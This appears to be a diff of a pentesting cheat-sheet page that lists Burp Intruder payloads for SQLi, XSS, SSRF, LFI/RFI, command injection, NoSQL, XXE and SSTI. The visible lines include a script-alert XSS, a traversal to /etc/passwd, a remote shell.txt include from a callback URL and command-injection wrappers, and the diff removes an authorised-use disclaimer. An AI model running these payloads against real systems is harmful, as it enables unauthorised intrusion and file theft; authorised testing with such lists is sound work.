@@ -1,4 +1,8 @@
-# Burp Intruder Fast Check
+---
+icon: bolt
+---
+
+# Burp Intruder Fast Discovery
 
 **Placeholders Used:**
 
@@ -24,8 +28,6 @@
 #### **Web Bolt Wordlist**
 
 **1. SQL Injection (SQLi)**
-
-code Codedownloadcontent\_copyexpand\_less
 
 ```
 # === Boolean-Based ===
@@ -73,8 +75,6 @@ code Codedownloadcontent\_copyexpand\_less
 
 **2. Cross-Site Scripting (XSS)**
 
-code Codedownloadcontent\_copyexpand\_less
-
 ```
 # === Basic Payloads ===
 "><script>alert(document.domain)</script>
@@ -108,8 +108,6 @@ jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</
 ```
 
 **3. Server-Side Request Forgery (SSRF)**
-
-code Codedownloadcontent\_copyexpand\_less
 
 ```
 # === Internal Hosts & IPs ===
@@ -146,8 +144,6 @@ http://{{CALLBACK_URL}}#{{TARGET_HOST}}/
 
 **4. Remote & Local File Inclusion (RFI/LFI)**
 
-code Codedownloadcontent\_copyexpand\_less
-
 ```
 # === LFI Payloads ===
 ../../../../../../../../etc/passwd
@@ -183,8 +179,6 @@ https://{{CALLBACK_URL}}/shell.txt
 
 **5. Command Injection / RCE**
 
-code Codedownloadcontent\_copyexpand\_less
-
 ```
 # === Linux Payloads ===
 ; {{CMD}}
@@ -215,8 +209,6 @@ $({{CMD}})
 
 **6. NoSQL Injection**
 
-code Codedownloadcontent\_copyexpand\_less
-
 ```
 # === General Payloads (often in JSON) ===
 {"$ne": "nonexistent"}
@@ -236,8 +228,6 @@ user[$regex]=^admin
 ```
 
 **7. XML External Entity (XXE)**
-
-code Codedownloadcontent\_copyexpand\_less
 
 ```
 # === Basic File Read ===
@@ -259,8 +249,6 @@ code Codedownloadcontent\_copyexpand\_less
 ```
 
 **8. Server-Side Template Injection (SSTI)**
-
-code Codedownloadcontent\_copyexpand\_less
 
 ```
 # === Detection Payloads ===
@@ -302,8 +290,6 @@ This is more about technique. Use Intruder's "Numbers" payload type.
   * 1,2,3...1000 (Number fuzzing)
 
 ***
-
-**Disclaimer:** This list is provided for educational purposes and for use in legal, authorized security testing environments such as Capture The Flag (CTF) events and professional penetration tests with explicit, written consent from the target organization.&#x20;
 
 {% hint style="warning" %}
 Unauthorized use of these payloads against systems you do not own or have permission to test is illegal and unethical.&#x20;
